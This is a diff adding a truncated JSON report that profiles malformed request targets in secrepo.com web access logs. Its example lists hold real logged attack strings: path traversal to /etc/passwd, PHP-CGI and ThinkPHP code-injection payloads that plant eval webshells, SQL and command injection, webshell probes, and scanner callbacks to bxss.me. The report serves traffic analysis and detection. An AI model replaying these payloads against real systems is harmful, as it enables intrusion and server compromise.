@@ -1,0 +1,1480 @@
+{
+ "source": "secrepo-2024-2026",
+ "format": "clf",
+ "static_site_signatures": true,
+ "files": 1021,
+ "meta": {
+  "file_errors": [],
+  "raw_lines": 2279367,
+  "attack_client_ips": 18920
+ },
+ "request_line_shapes": {
+  "ok": 2279367
+ },
+ "methods": {
+  "GET": 2156024,
+  "HEAD": 118032,
+  "OPTIONS": 22,
+  "POST": 5276,
+  "OTHER": 7,
+  "PUT": 6
+ },
+ "attack_exclusions": {
+  "scanner_session_ip": 167788,
+  "target_signature": 443456,
+  "scanner_user_agent": 3198,
+  "absolute_or_asterisk_form": 10224,
+  "nonstandard_method": 7
+ },
+ "detector_vs_reference_disagreements": {
+  "examples": []
+ },
+ "forbidden_ascii_chars_path": {
+  "'\"'": 105,
+  "'|'": 56,
+  "']'": 29,
+  "'['": 29,
+  "'<'": 26,
+  "'>'": 23,
+  "'^'": 15,
+  "'{'": 8,
+  "'}'": 5,
+  "'`'": 4
+ },
+ "forbidden_ascii_chars_query": {
+  "'['": 2135,
+  "']'": 2134,
+  "'\"'": 1387,
+  "'}'": 531,
+  "'{'": 415,
+  "'\\\\'": 272,
+  "'>'": 126,
+  "'<'": 121,
+  "'^'": 9,
+  "'`'": 4,
+  "'|'": 3
+ },
+ "raw": {
+  "lines": 2279367,
+  "unique_targets": 64131,
+  "ref_reject_lines": 62470,
+  "pct_ref_reject": 2.7407,
+  "ref_308_lines": 76017,
+  "pct_ref_308": 3.335,
+  "clauses": {
+   "p.not_origin_form": {
+    "lines": 10225,
+    "pct_lines": 0.4486,
+    "sole_cause_lines": 9626,
+    "pct_sole": 0.4223,
+    "unique_targets": 1471,
+    "pct_unique": 2.2937,
+    "examples": [
+     "http://www.secrepo.com/",
+     "?",
+     "http://www.secrepo.com/apple-touch-icon.png",
+     "http://www.secrepo.com/bootstrap/img/favicon.ico",
+     "https://www.secrepo.com/honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf",
+     "http://www.secrepo.com/twitter-icon.png"
+    ]
+   },
+   "p.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.bad_pct": {
+    "lines": 23,
+    "pct_lines": 0.001,
+    "sole_cause_lines": 21,
+    "pct_sole": 0.0009,
+    "unique_targets": 16,
+    "pct_unique": 0.0249,
+    "examples": [
+     "/self.logs/%s",
+     "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/images/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/js/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells",
+     "/scripts/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/shells"
+    ]
+   },
+   "p.enc_slash": {
+    "lines": 71,
+    "pct_lines": 0.0031,
+    "sole_cause_lines": 48,
+    "pct_sole": 0.0021,
+    "unique_targets": 57,
+    "pct_unique": 0.0889,
+    "examples": [
+     "//bxss.me//%2F..",
+     "/\\\\bxss.me//%2F..",
+     "/assets/%2f",
+     "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shells",
+     "/domaindata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+     "/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini"
+    ]
+   },
+   "p.enc_backslash": {
+    "lines": 80,
+    "pct_lines": 0.0035,
+    "sole_cause_lines": 72,
+    "pct_sole": 0.0032,
+    "unique_targets": 24,
+    "pct_unique": 0.0374,
+    "examples": [
+     "/honeypot/%5C%22https:/twitter.com/sooshie%5C%22",
+     "/honeypot/%5C%22https:/twitter.com/theroxyd%5C%22",
+     "/honeypot/%5C%22http:/amunhoney.sourceforge.net/%5C%22",
+     "/honeypot/%5C%22http:/glastopf.org/%5C%22",
+     "/honeypot/%5C%22http:/www.maxmind.com%5C%22",
+     "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/hosts"
+    ]
+   },
+   "p.enc_semicolon": {
+    "lines": 5,
+    "pct_lines": 0.0002,
+    "sole_cause_lines": 4,
+    "pct_sole": 0.0002,
+    "unique_targets": 5,
+    "pct_unique": 0.0078,
+    "examples": [
+     "/%3bassert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'))%3b/PE_malware/OPCleaver.html",
+     "/'%3bprint(md5(31337))%3b$a='/PE_malware/OPCleaver.html",
+     "/\"%3bprint(md5(31337))%3b$a=\"/PE_malware/OPCleaver.html",
+     "/Datasets%20Description/%3bassert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'))%3b/OPCleaver.html",
+     "/Datasets%20Description/'%3bprint(md5(31337))%3b$a='/OPCleaver.html"
+    ]
+   },
+   "p.enc_nul": {
+    "lines": 376,
+    "pct_lines": 0.0165,
+    "sole_cause_lines": 370,
+    "pct_sole": 0.0162,
+    "unique_targets": 11,
+    "pct_unique": 0.0172,
+    "examples": [
+     "/.%00/WEB-INF/web.xml",
+     "/1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg/PE_malware/OPCleaver.html",
+     "/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1/PE_malware/OPCleaver.html",
+     "/Datasets%20Description/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1/OPCleaver.html",
+     "/Datasets%20Description/PE_malware/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1.html",
+     "/Datasets%20Description/HTML_Bro_log_1/%00http"
+    ]
+   },
+   "p.enc_pct": {
+    "lines": 257,
+    "pct_lines": 0.0113,
+    "sole_cause_lines": 209,
+    "pct_sole": 0.0092,
+    "unique_targets": 165,
+    "pct_unique": 0.2573,
+    "examples": [
+     "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fshells%23foo/development",
+     "/console/images/%252e%252e%252f/console.portal?_nfpb=true&_pageLabel=&handle=1",
+     "/squid/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+     "/css/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd",
+     "/domaindata/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
+     "/squid/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/windows/win.ini"
+    ]
+   },
+   "p.enc_ctrl": {
+    "lines": 16,
+    "pct_lines": 0.0007,
+    "sole_cause_lines": 4,
+    "pct_sole": 0.0002,
+    "unique_targets": 12,
+    "pct_unique": 0.0187,
+    "examples": [
+     "/%0a.example.com",
+     "/servlet/%0ARefresh:0;URL=javascript:prompt(1)%0A1",
+     "/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1/PE_malware/OPCleaver.html",
+     "/Datasets%20Description/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1/OPCleaver.html",
+     "/Datasets%20Description/PE_malware/12345'\"\\\\'\\\\\");|]*%00{%0d%0a<%00>%bf%27'\\xf0\\x9f\\x92\\xa1.html",
+     "/\"+\"A\".concat(70-3).concat(22*4).concat(108).concat(74).concat(100).concat(82)+(require\"socket\"%0aSocket.gethostbyname(\"hitgf\"+\"szzqnqly23e25.bxss.me.\")[3].to_s"
+    ]
+   },
+   "p.enc_nonascii": {
+    "lines": 757,
+    "pct_lines": 0.0332,
+    "sole_cause_lines": 734,
+    "pct_sole": 0.0322,
+    "unique_targets": 78,
+    "pct_unique": 0.1216,
+    "examples": [
+     "/%C2%A0%C2%A0",
+     "/%C3%82%C2%A0%C3%82",
+     "/%C2%A0",
+     "/modules/mod_simplefileuploadv1.3/elements/%C2%AE.php",
+     "/modules/mod_simplefileuploadv1.3/elements/%C2%AE.php7",
+     "/wp-content/themes/alera/%C2%AE.php"
+    ]
+   },
+   "p.raw_nonascii": {
+    "lines": 1797,
+    "pct_lines": 0.0788,
+    "sole_cause_lines": 1763,
+    "pct_sole": 0.0773,
+    "unique_targets": 225,
+    "pct_unique": 0.3508,
+    "examples": [
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.rar",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.zip",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.tar.gz",
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.7z",
+     "/\\xb1\\xb8\\xb7\\xdd.rar",
+     "/\\xb1\\xb8\\xb7\\xdd.zip"
+    ]
+   },
+   "p.backslash": {
+    "lines": 25,
+    "pct_lines": 0.0011,
+    "sole_cause_lines": 7,
+    "pct_sole": 0.0003,
+    "unique_targets": 21,
+    "pct_unique": 0.0327,
+    "examples": [
+     "/static\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\shells",
+     "/\\\\bxss.me",
+     "/\\\\bxss.me//%2F..",
+     "/echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23'%20&echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23|\"%20&echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23/PE_malware/OPCleaver.",
+     "/auth.log/%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\windows/win.ini",
+     "/auth.log/%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\%2e%2e\\\\etc/passwd"
+    ]
+   },
+   "p.semicolon": {
+    "lines": 104,
+    "pct_lines": 0.0046,
+    "sole_cause_lines": 87,
+    "pct_sole": 0.0038,
+    "unique_targets": 33,
+    "pct_unique": 0.0515,
+    "examples": [
+     "/s/933313e2132323e23333e26363/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties",
+     "/;",
+     "/seeyon/thirdpartyController.do.css/..;/ajax.do",
+     "/jkstatus;a",
+     "/s/1xugdXf2gy4LHvZThieDT4/_/;/WEB-INF/decorators.xml",
+     "/bonita/API/portal/page/;i18ntranslation"
+    ]
+   },
+   "p.space": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.other_forbidden_ascii": {
+    "lines": 121,
+    "pct_lines": 0.0053,
+    "sole_cause_lines": 85,
+    "pct_sole": 0.0037,
+    "unique_targets": 77,
+    "pct_unique": 0.1201,
+    "examples": [
+     "/.well-known/acme-challenge/<53145403>",
+     "/|~.aspx",
+     "/\"+response.write(9119768*9381183)+\"/PE_malware/OPCleaver.html",
+     "/echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23'%20&echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23|\"%20&echo%20idnsvu$()\\\\%20vaztir\\\\nz^xyu||a%20%23/PE_malware/OPCleaver.",
+     "/Datasets%20Description<esi:include%20src=\"http:%2f%2fbxss.me%2frpb.png\"%2f>/PE_malware/OPCleaver.html",
+     "/${9999291+9999202}/PE_malware/OPCleaver.html"
+    ]
+   },
+   "p.dot_segment": {
+    "lines": 68,
+    "pct_lines": 0.003,
+    "sole_cause_lines": 48,
+    "pct_sole": 0.0021,
+    "unique_targets": 43,
+    "pct_unique": 0.0671,
+    "examples": [
+     "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/images/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/vpn/../vpns/cfg/smb.conf",
+     "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/js/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells",
+     "/scripts/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shells"
+    ]
+   },
+   "p.empty_segment": {
+    "lines": 22573,
+    "pct_lines": 0.9903,
+    "sole_cause_lines": 21977,
+    "pct_sole": 0.9642,
+    "unique_targets": 8316,
+    "pct_unique": 12.9672,
+    "examples": [
+     "//?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=f",
+     "//bootstrap/img/favicon.ico",
+     "//public/js/libraries/filemanager/dialog.php",
+     "//js/libraries/filemanager/dialog.php",
+     "/honeypot//%22http://amunhoney.sourceforge.net//%22",
+     "/honeypot//%22http://glastopf.org//%22"
+    ]
+   },
+   "p.trailing_slash_308": {
+    "lines": 97524,
+    "pct_lines": 4.2786,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 3253,
+    "pct_unique": 5.0724,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "//?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=f",
+     "/self.logs/?C=S;O=A"
+    ]
+   },
+   "q.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.empty_pair": {
+    "lines": 13,
+    "pct_lines": 0.0006,
+    "sole_cause_lines": 9,
+    "pct_sole": 0.0004,
+    "unique_targets": 11,
+    "pct_unique": 0.0172,
+    "examples": [
+     "/?id.__proto__.expect=100-continue&id.constructor.prototype.expect=100-continue&id[__proto__][expect]=100-continue&__proto__.expect=100-continue&constructor.pro",
+     "/pp404?id.__proto__.expect=100-continue&id.constructor.prototype.expect=100-continue&id[__proto__][expect]=100-continue&__proto__.expect=100-continue&constructo",
+     "/?id=JJJ0QQQ&action=JJJ1QQQ&page=JJJ2QQQ&name=JJJ3QQQ&f=JJJ4QQQ&url=JJJ5QQQ&email=JJJ6QQQ&type=JJJ7QQQ&file=JJJ8QQQ&title=JJJ9QQQ&code=JJJ10QQQ&q=JJJ11QQQ&user=",
+     "/?id=JJJ0QQQ&action=JJJ1QQQ&page=JJJ2QQQ&name=JJJ3QQQ&f=JJJ4QQQ&url=JJJ5QQQ&email=JJJ6QQQ&type=JJJ7QQQ&file=JJJ8QQQ&title=JJJ9QQQ&code=JJJ10QQQ&q=JJJ11QQQ&user=",
+     "/maccdc2012/http.log.gz?&range=0",
+     "/maccdc2012/http.log.gz?&range=6927373"
+    ]
+   },
+   "q.no_eq": {
+    "lines": 3094,
+    "pct_lines": 0.1357,
+    "sole_cause_lines": 2286,
+    "pct_sole": 0.1003,
+    "unique_targets": 382,
+    "pct_unique": 0.5957,
+    "examples": [
+     "//?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=f",
+     "/?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/*",
+     "//xmlrpc.php?rsd",
+     "//?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=f",
+     "/wp-content/themes/pridmag/db.php?u",
+     "/wp-content/plugins/linkpreview/db.php?u"
+    ]
+   },
+   "q.multi_eq": {
+    "lines": 17833,
+    "pct_lines": 0.7824,
+    "sole_cause_lines": 66,
+    "pct_sole": 0.0029,
+    "unique_targets": 407,
+    "pct_unique": 0.6346,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/2015/?C=N;O=A"
+    ]
+   },
+   "q.empty_name": {
+    "lines": 5,
+    "pct_lines": 0.0002,
+    "sole_cause_lines": 5,
+    "pct_sole": 0.0002,
+    "unique_targets": 3,
+    "pct_unique": 0.0047,
+    "examples": [
+     "/index.php?=phpinfo()",
+     "/fm.php?=",
+     "/ww1.php?="
+    ]
+   },
+   "q.bad_pct": {
+    "lines": 3,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 2,
+    "pct_unique": 0.0031,
+    "examples": [
+     "/homepage/search/?q=1%%27)+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(520),0x7e)))%20from%20information_schema",
+     "/plus/ajax_common.php?act=hotword&query=aa%%e9%8c%a6%27%20union%20select%201,md5(999999999),3%23%27"
+    ]
+   },
+   "q.enc_amp_eq": {
+    "lines": 5396,
+    "pct_lines": 0.2367,
+    "sole_cause_lines": 274,
+    "pct_sole": 0.012,
+    "unique_targets": 852,
+    "pct_unique": 1.3285,
+    "examples": [
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "/self.logs/?C=M%3BO%3DA",
+     "/Datasets%20Description/Network?C=D%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1?C=S%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1/?C=S%3BO%3DA",
+     "/Datasets%20Description?C=N%3BO%3DD"
+    ]
+   },
+   "q.enc_semicolon": {
+    "lines": 3365,
+    "pct_lines": 0.1476,
+    "sole_cause_lines": 6,
+    "pct_sole": 0.0003,
+    "unique_targets": 548,
+    "pct_unique": 0.8545,
+    "examples": [
+     "/Datasets%20Description/Network/?C=D%3BO%3DA",
+     "/self.logs/?C=M%3BO%3DA",
+     "/Datasets%20Description/Network?C=D%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1?C=S%3BO%3DA",
+     "/Datasets%20Description/HTML_Bro_log_1/?C=S%3BO%3DA",
+     "/Datasets%20Description?C=N%3BO%3DD"
+    ]
+   },
+   "q.enc_plus": {
+    "lines": 54,
+    "pct_lines": 0.0024,
+    "sole_cause_lines": 1,
+    "pct_sole": 0.0,
+    "unique_targets": 21,
+    "pct_unique": 0.0327,
+    "examples": [
+     "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
+     "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua",
+     "/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};top[%27al%27%2B%",
+     "/roller-ui/login.rol?pageTitle=${new%20java.lang.Integer(99845%2b99248)}",
+     "/style.php?p=J938PnuGv1QZCrNF6%2B2Zh81Kh1LkbWI20JU3La%2BrEPOWZKToeebeUDXrR8BZYXfYBqmUfOUyJ552h6ifeNsJyXHd0YcuVhbPMxL60L9ESMa9ilqIQCueFw8wkWMxVW84IWGa1%2BkY%2B%2",
+     "/wp-includes/style.php?p=J938PnuGv1QZCrNF6%2B2Zh81Kh1LkbWI20JU3La%2BrEPOWZKToeebeUDXrR8BZYXfYBqmUfOUyJ552h6ifeNsJyXHd0YcuVhbPMxL60L9ESMa9ilqIQCueFw8wkWMxVW84IWG"
+    ]
+   },
+   "q.enc_pct": {
+    "lines": 325,
+    "pct_lines": 0.0143,
+    "sole_cause_lines": 203,
+    "pct_sole": 0.0089,
+    "unique_targets": 200,
+    "pct_unique": 0.3119,
+    "examples": [
+     "/bitrix/redirect.php?goto=https://www.secrepo.com%252F@bxss.me/",
+     "/concat?/%2557EB-INF/web.xml",
+     "/static?/%2557EB-INF/web.xml",
+     "//index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%25%2A27an%2Ad%25%2A20updat*exml%281%2Ccon*cat%280x7e%2C%28us*er%28%29%29%2C0x7e%29%2C1%",
+     "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%2A%25%2A2%2A7%2Aa%2An%2Ad%2A%25%2A2%2A0*u*p*d*a*t***e*x*m*l*%28*1*%2C*c*o*n*c*a*t*%28*0*",
+     "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%25%2A27an%2Ad%25%2A20updat*exml%281%2Ccon*cat%280x7e%2C%28us*er%28%29%29%2C0x7e%29%2C1%2"
+    ]
+   },
+   "q.enc_nul_ctrl": {
+    "lines": 18,
+    "pct_lines": 0.0008,
+    "sole_cause_lines": 5,
+    "pct_sole": 0.0002,
+    "unique_targets": 15,
+    "pct_unique": 0.0234,
+    "examples": [
+     "/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};top[%27al%27%2B%",
+     "/horde/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00",
+     "/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00",
+     "/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=nrghr.php&updateHost=http://%22_blank%22%3Ewww.xp.cn%3C/a%3E%20%3C/div%3E%0D%0A%20%20%20",
+     "/index.php?keyword=%0c&p=article&sql=}{pboot:sql{pboot:keyword}sql=update/*{pboot:keyword}num=*/ay_user/**/set/**/--a-}{/pboot:sql}",
+     "/article/?keyword=%0c&sql=}{pboot:sql{pboot:keyword}sql=update/*{pboot:keyword}num=*/ay_user/**/set/**/--a-}{/pboot:sql}"
+    ]
+   },
+   "q.enc_nonascii": {
+    "lines": 192,
+    "pct_lines": 0.0084,
+    "sole_cause_lines": 12,
+    "pct_sole": 0.0005,
+    "unique_targets": 49,
+    "pct_unique": 0.0764,
+    "examples": [
+     "/index.php?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+     "/cgi-bin/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+error_reporting%3D0+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+     "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+error_reporting%3D0+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+     "/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input",
+     "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input",
+     "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+    ]
+   },
+   "q.plus": {
+    "lines": 570,
+    "pct_lines": 0.025,
+    "sole_cause_lines": 270,
+    "pct_sole": 0.0118,
+    "unique_targets": 111,
+    "pct_unique": 0.1731,
+    "examples": [
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&refsrc=email&iid=2572d65d1a814c138a77f3b60465fe37&uid=30635594&nid=244+272699400",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=dee6e0155a3649fb944f3edea7220ae6&uid=84117791&nid=244+285282312",
+     "/c.php?cmd=which+bash",
+     "/shell.php?cmd=which+bash",
+     "/exec.php?cmd=which+bash",
+     "/tmp/cmd.php?cmd=which+bash"
+    ]
+   },
+   "q.semicolon": {
+    "lines": 19331,
+    "pct_lines": 0.8481,
+    "sole_cause_lines": 25,
+    "pct_sole": 0.0011,
+    "unique_targets": 561,
+    "pct_unique": 0.8748,
+    "examples": [
+     "/self.logs/2015/?C=D;O=A",
+     "/self.logs/2015/?C=N;O=D",
+     "/self.logs/2016/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/2015/?C=N;O=A"
+    ]
+   },
+   "q.raw_nonascii": {
+    "lines": 12,
+    "pct_lines": 0.0005,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 6,
+    "pct_unique": 0.0094,
+    "examples": [
+     "/index.php?s=index/\\\\think\\\\template\\\\driver\\\\file/write?cacheFile=^\\xe6\\x96\\x87\\xe4\\xbb\\xb6\\xe5\\x90\\x8d^&content=<?php%20class%20GaM10fA5%20{%20public%20function%20__construct($H7mu6){%20@ev",
+     "/index.php?s=index/\\\\think\\\\template\\\\driver\\\\file/write?cacheFile=^\\xe9\\x8f\\x82\\xe5\\x9b\\xa6\\xe6\\xac\\xa2\\xe9\\x8d\\x9a\\xe5\\xb3\\x96&content=<?php%20class%20GaM10fA5%20{%20public%20function%20__construct($H7mu6){%",
+     "/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=^\\xe6\\x96\\x87\\xe4\\xbb\\xb6\\xe5\\x90\\x8d^&vars[1][]=<?php%20class%20GaM10fA5%20{%20",
+     "/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=^\\xe9\\x8f\\x82\\xe5\\x9b\\xa6\\xe6\\xac\\xa2\\xe9\\x8d\\x9a\\xe5\\xb3\\x96&vars[1][]=<?php%20class%20GaM10fA5%2",
+     "/?s=index/\\\\think\\\\template\\\\driver\\\\file/write&cacheFile=^\\xe6\\x96\\x87\\xe4\\xbb\\xb6\\xe5\\x90\\x8d^&content=<?php%20class%20GaM10fA5%20{%20public%20function%20__construct($H7mu6){%20@eval(\"/*ZG5",
+     "/?s=index/\\\\think\\\\template\\\\driver\\\\file/write&cacheFile=^\\xe9\\x8f\\x82\\xe5\\x9b\\xa6\\xe6\\xac\\xa2\\xe9\\x8d\\x9a\\xe5\\xb3\\x96&content=<?php%20class%20GaM10fA5%20{%20public%20function%20__construct($H7mu6){%20@eval(\""
+    ]
+   },
+   "q.space": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.fragment": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.other_forbidden_ascii": {
+    "lines": 794,
+    "pct_lines": 0.0348,
+    "sole_cause_lines": 513,
+    "pct_sole": 0.0225,
+    "unique_targets": 399,
+    "pct_unique": 0.6222,
+    "examples": [
+     "/?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/*",
+     "//type.php?template=tag_(){};@unlink(FILE);print_r(xbshell);assert($_POST[1]);{//../rss",
